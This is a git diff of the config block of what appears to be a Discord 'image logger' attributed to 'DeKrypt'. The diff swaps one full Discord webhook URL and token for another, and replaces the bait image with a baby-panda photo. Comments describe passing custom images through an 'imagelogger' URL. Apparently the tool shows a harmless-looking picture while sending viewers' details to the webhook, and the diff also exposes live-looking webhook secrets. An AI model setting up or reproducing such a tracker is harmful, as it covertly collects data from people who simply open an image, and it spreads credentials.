@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1543510711127252997/EzHV6_1ldfWnwe6JD-n80Iv1fNcaGqulJguSQkKEgjxPJy4RQR6NnxT3tA90mDuHOMgv",
+    "image": "https://thumbs.dreamstime.com/b/ein-panda-baby-auch-bekannt-als-tuben-ist-das-junge-eines-riesigen-sie-werden-der-regel-nur-mit-einem-gewicht-von-unzen-geboren-274375663.jpg?w=768", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
